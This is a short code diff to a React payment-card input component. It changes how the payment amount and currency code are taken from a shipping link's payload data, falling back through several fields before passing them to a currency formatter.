@@ -44,9 +44,10 @@ const PaymentCardInput = () => {
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
 
   const shippingInfo = linkData?.payload as any;
+  const paymentData = shippingInfo?.payment_data;
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
+  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
+  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -61,7 +62,9 @@ const PaymentCardInput = () => {
     }
   }
 
-  const formattedAmount = formatCurrency(amount, selectedCountry);
+  // Get currency code from link data
+  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || selectedCountry;
+  const formattedAmount = formatCurrency(amount, currencyCode);
 
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
